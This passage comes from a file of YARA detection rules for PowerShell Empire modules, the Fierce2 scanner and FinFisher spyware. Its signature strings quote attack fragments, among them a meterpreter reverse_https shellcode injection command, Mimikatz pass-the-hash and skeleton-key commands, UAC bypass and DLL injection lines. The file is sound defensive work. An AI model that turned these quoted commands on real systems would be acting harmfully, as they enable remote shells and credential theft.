@(, $(Get-ChildItem -Path $UserMasterKeyFolder -Force | Select-Object -ExpandProperty FullName) )\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7223 and filesize < 80KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_SSHCommand\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-SSHCommand.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_SSHCommand\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$Base64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA\" ascii\n        $s2 = \"Invoke-SSHCommand -ip 192.168.1.100 -Username root -Password test -Command \\\"id\\\"\" fullword ascii\n        $s3 = \"Write-Verbose \\\"[*] Error loading dll\\\"\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x660a and filesize < 2000KB and 1 of them) or all of them\n}\n\nrule Empire_PowerShell_Framework_Gen1\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_PowerShell_Framework_Gen1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Write-BytesToMemory -Bytes $Shellcode\" ascii\n        $s2 = \"$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 4000KB and 1 of them) or all of them\n}\n\nrule Empire_PowerUp_Gen\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (files: PowerUp.ps1, PowerUp.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_PowerUp_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$Result = sc.exe config $($TargetService.Name) binPath= $OriginalPath\" fullword ascii\n        $s2 = \"$Result = sc.exe pause $($TargetService.Name)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x233c and filesize < 2000KB and 1 of them) or all of them\n}\n\nrule Empire_PowerShell_Framework_Gen2\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_PowerShell_Framework_Gen2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)\" fullword ascii\n        $s20 = \"#Shellcode: CallDllMain.asm\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 4000KB and 1 of them) or all of them\n}\n\nrule Empire_Agent_Gen\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (files: agent.ps1, agent.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Agent_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$wc.Headers.Add(\\\"User-Agent\\\",$script:UserAgent)\" fullword ascii\n        $s2 = \"$min = [int]((1-$script:AgentJitter)*$script:AgentDelay)\" fullword ascii\n        $s3 = \"if ($script:AgentDelay -ne 0){\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x660a and filesize < 100KB and 1 of them) or all of them\n}\n\nrule Empire_PowerShell_Framework_Gen3\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_PowerShell_Framework_Gen3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"if (($PEInfo.FileType -ieq \\\"DLL\\\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))\" fullword ascii\n        $s2 = \"remote DLL injection\" ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 4000KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_InveighRelay_Gen\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (files: Invoke-InveighRelay.ps1, Invoke-InveighRelay.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_InveighRelay_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$inveigh.SMBRelay_failed_list.Add(\\\"$HTTP_NTLM_domain_string\\\\$HTTP_NTLM_user_string $SMBRelayTarget\\\")\" fullword ascii\n        $s2 = \"$NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 200KB and 1 of them) or all of them\n}\n\nrule Empire_KeePassConfig_Gen\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (files: KeePassConfig.ps1, KeePassConfig.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_KeePassConfig_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7223 and filesize < 80KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_Portscan_Gen\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (files: Invoke-Portscan.ps1, Invoke-Portscan.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_Portscan_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Test-Port -h $h -p $Port -timeout $Timeout\" fullword ascii\n        $s2 = \"1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 100KB and 1 of them) or all of them\n}\n\nrule Empire_PowerShell_Framework_Gen4\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_PowerShell_Framework_Gen4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }\" fullword ascii\n        $s2 = \"# Get a handle to the module specified\" fullword ascii\n        $s3 = \"$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))\" fullword ascii\n        $s4 = \"$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 4000KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_CredentialInjection_Invoke_Mimikatz_Gen\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (files: Invoke-CredentialInjection.ps1, Invoke-Mimikatz.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_CredentialInjection_Invoke_Mimikatz_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle\" fullword ascii\n        $s2 = \"$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 4000KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_Gen\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (files: Invoke-DCSync.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1)\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$Shellcode1 += 0x48\" fullword ascii\n        $s2 = \"$PEHandle = [IntPtr]::Zero\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 3000KB and 1 of them) or all of them\n}\n\nrule Empire_PowerShell_Framework_Gen5\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent\"\n        ref = \"https://github.com/adaptivethreat/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_PowerShell_Framework_Gen5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"if ($ExeArgs -ne $null -and $ExeArgs -ne '')\" fullword ascii\n        $s2 = \"$ExeArgs = \\\"ReflectiveExe $ExeArgs\\\"\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x7566 and filesize < 1000KB and 1 of them) or all of them\n}\n\nrule Empire_Invoke_BypassUAC\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-BypassUAC.ps1)\"\n        ref = \"https://github.com/PowerShellEmpire/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_BypassUAC\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory\" fullword ascii\n        $s2 = \"$proc = Start-Process -WindowStyle Hidden notepad.exe -PassThru\" fullword ascii\n        $s3 = \"$Payload = Invoke-PatchDll -DllBytes $Payload -FindString \\\"ExitThread\\\" -ReplaceString \\\"ExitProcess\\\"\" fullword ascii\n        $s4 = \"$temp = [System.Text.Encoding]::UNICODE.GetBytes($szTempDllPath)\" fullword ascii\n\n    condition:\n        filesize < 1200KB and 3 of them\n}\n\nrule Empire_lib_modules_trollsploit_message\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: message.py)\"\n        ref = \"https://github.com/PowerShellEmpire/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_lib_modules_trollsploit_message\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"script += \\\" -\\\" + str(option) + \\\" \\\\\\\"\\\" + str(values['Value'].strip(\\\"\\\\\\\"\\\")) + \\\"\\\\\\\"\\\"\" fullword ascii\n        $s2 = \"if option.lower() != \\\"agent\\\" and option.lower() != \\\"computername\\\":\" fullword ascii\n        $s3 = \"[String] $Title = 'ERROR - 0xA801B720'\" fullword ascii\n        $s4 = \"'Value'         :   'Lost contact with the Domain Controller.'\" fullword ascii\n\n    condition:\n        filesize < 10KB and 3 of them\n}\n\nrule Empire_Persistence\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Persistence.psm1)\"\n        ref = \"https://github.com/PowerShellEmpire/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Persistence\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\PS>Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -V\" ascii\n        $s2 = \"# Execute the following to remove the user-level persistent payload\" fullword ascii\n        $s3 = \"$PersistantScript = $PersistantScript.ToString().Replace('EXECUTEFUNCTION', \\\"$PersistenceScriptName -Persist\\\")\" fullword ascii\n\n    condition:\n        filesize < 108KB and 1 of them\n}\n\nrule Empire_portscan\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: portscan.py)\"\n        ref = \"https://github.com/PowerShellEmpire/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_portscan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"script += \\\"Invoke-PortScan -noProgressMeter -f\\\"\" fullword ascii\n        $s2 = \"script += \\\" | ? {$_.alive}| Select-Object HostName,@{name='OpenPorts';expression={$_.openPorts -join ','}} | ft -wrap | Out-Str\" ascii\n\n    condition:\n        filesize < 14KB and all of them\n}\n\nrule Empire_Invoke_Shellcode\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-Shellcode.ps1)\"\n        ref = \"https://github.com/PowerShellEmpire/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_Shellcode\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbos\" ascii\n        $s2 = \"\\\"Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!\\\" ) )\" fullword ascii\n        $s3 = \"$RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)\" fullword ascii\n\n    condition:\n        filesize < 100KB and 1 of them\n}\n\nrule Empire_Invoke_Mimikatz\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Invoke-Mimikatz.ps1)\"\n        ref = \"https://github.com/PowerShellEmpire/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Invoke_Mimikatz\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$PEBytes64 = \\\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwc\" ascii\n        $s2 = \"[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)\" fullword ascii\n        $s3 = \"Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp\" fullword ascii\n\n    condition:\n        filesize < 2500KB and 2 of them\n}\n\nrule Empire_lib_modules_credentials_mimikatz_pth\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: pth.py)\"\n        ref = \"https://github.com/PowerShellEmpire/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_lib_modules_credentials_mimikatz_pth\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]\" fullword ascii\n        $s1 = \"command = \\\"sekurlsa::pth /user:\\\"+self.options[\\\"user\\\"]['Value']\" fullword ascii\n\n    condition:\n        filesize < 12KB and all of them\n}\n\nrule Empire_Write_HijackDll\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: Write-HijackDll.ps1)\"\n        ref = \"https://github.com/PowerShellEmpire/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_Write_HijackDll\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$DllBytes = Invoke-PatchDll -DllBytes $DllBytes -FindString \\\"debug.bat\\\" -ReplaceString $BatchPath\" fullword ascii\n        $s2 = \"$DllBytes32 = \\\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBw\" ascii\n        $s3 = \"[Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)\" fullword ascii\n\n    condition:\n        filesize < 500KB and 2 of them\n}\n\nrule Empire_skeleton_key\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: skeleton_key.py)\"\n        ref = \"https://github.com/PowerShellEmpire/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_skeleton_key\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"script += \\\"Invoke-Mimikatz -Command '\\\\\\\"\\\" + command + \\\"\\\\\\\"';\\\"\" fullword ascii\n        $s2 = \"script += '\\\"Skeleton key implanted. Use password \\\\'mimikatz\\\\' for access.\\\"'\" fullword ascii\n        $s3 = \"command = \\\"misc::skeleton\\\"\" fullword ascii\n        $s4 = \"\\\"ONLY APPLICABLE ON DOMAIN CONTROLLERS!\\\"),\" fullword ascii\n\n    condition:\n        filesize < 6KB and 2 of them\n}\n\nrule Empire_invoke_wmi\n{\n    meta:\n        description = \"Empire: PowerShell post-exploitation agent (file: invoke_wmi.py)\"\n        ref = \"https://github.com/PowerShellEmpire/Empire\"\n        classifications = \"Hacktool\"\n        threat_names = \"Empire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Empire_invoke_wmi\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]\" fullword ascii\n        $s2 = \"script += \\\";'Invoke-Wmi executed on \\\" +computerNames +\\\"'\\\"\" fullword ascii\n        $s3 = \"script = \\\"$PSPassword = \\\\\\\"\\\"+password+\\\"\\\\\\\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Man\" ascii\n\n    condition:\n        filesize < 20KB and 2 of them\n}\n\nrule Fierce2\n{\n    meta:\n        description = \"Fierce2: domain scanner\"\n        classifications = \"Hacktool\"\n        threat_names = \"Fierce2\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Fierce2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,\"\n\n    condition:\n        1 of them\n}\n\nrule FinFisher_2\n{\n    meta:\n        description = \"FinFisher / FinSpy: surveillance software\"\n        classifications = \"Hacktool\"\n        threat_names = \"FinFisher\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"botherder https://github.com/botherder\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FinSpy_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $password1 = /\\/scomma kbd101\\.sys/ wide ascii\n        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii\n        $password3 = /\\/scomma excel2010\\.part/ wide ascii\n        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii\n        $password5 = /\\/stab MSVCR32\\.manifest/ wide ascii\n        $password6 = /\\/scomma MSN2010\\.dll/ wide ascii\n        $password7 = /\\/scomma Firefox\\.base/ wide ascii\n        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii\n        $password9 = /\\/scomma IE7setup\\.sys/ wide ascii\n        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii\n        $password11 = /\\/scomma office2007\\.cab/ wide ascii\n        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii\n        $password13 = /\\/scomma outlook2007\\.dll/ wide ascii\n        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii\n        $screenrec1 = /(s)111o00000000\\.dat/ wide ascii\n        $screenrec2 = /(t)111o00000000\\.dat/ wide ascii\n        $screenrec3 = /(f)113o00000000\\.dat/ wide ascii\n        $screenrec4 = /(w)114o00000000\\.dat/ wide ascii\n        $screenrec5 = /(u)112Q00000000\\.dat/ wide ascii\n        $screenrec6 = /(v)112Q00000000\\.dat/ wide ascii\n        $screenrec7 = /(v)112O00000000\\.dat/ wide ascii\n        $micrec = /2101[0-9A-F]{8}\\.dat/ wide ascii\n        $skyperec1 = /\\[%19s\\] %25s\\:    %s/ wide ascii\n        $skyperec2 = /Global\\\\\\{A48F1A32\\-A340\\-11D0\\-BC6B\\-00A0C903%\\.04X\\}/ wide\n        $skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\\.dat/ wide ascii\n        $mouserec1 = /(m)sc183Q000\\.dat/ wide ascii\n        $mouserec2 = /2201[0-9A-F]{8}\\.dat/ wide ascii\n        $driver = /\\\\\\\\\\\\\\\\\\.\\\\\\\\driverw/ wide ascii\n        $janedow1 = /(J)ane Dow\\'s x32 machine/ wide ascii\n        $janedow2 = /(J)ane Dow\\'s x64 machine/ wide ascii\n        $versions1 = /(f)inspyv2/ nocase\n        $versions2 = /(f)inspyv4/ nocase\n        $bootkit1 = /(b)ootkit_x32driver/\n        $bootkit2 = /(b)ootkit_x64driver/\n        $typo1 = /(S)creenShort Recording/ wide\n        $mssounddx = /(S)ystem\\\\CurrentControlSet\\\\Services\\\\mssounddx/ wide\n\n    condition:\n        8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or any of ($mouserec*) or $driver or any of ($janedow*) or any of ($versions*) or any of ($bootkit*) or $typo1 or $mssounddx\n}\n\nrule FinFisher\n{\n    meta:\n        description = \"FinFisher / FinSpy: surveillance software\"\n        classifications = \"Hacktool\"\n        threat_names = \"FinFisher\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"AlienVault Labs\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FinSpy\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $filter1 = \"$password14\"\n        $filter2 = \"$screenrec7\"\n        $filter3 = \"$micrec\"\n        $filter4 = \"$skyperec3\"\n        $filter5 = \"$mouserec2\"\n        $filter6 = \"$driver\"\n        $filter7 = \"$janedow2\"\n        $filter8 = \"$bootkit2\"\n        $password1 = /\\/scomma kbd101\\.sys/ wide ascii\n        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii\n        $password3 = /\\/scomma excel2010\\.part/ wide ascii\n        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii\n        $password5 = /\\/stab MSVCR32\\.manifest/ wide ascii\n        $password6 = /\\/scomma MSN2010\\.dll/ wide ascii\n        $password7 = /\\/scomma Firefox\\.base/ wide ascii\n        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD 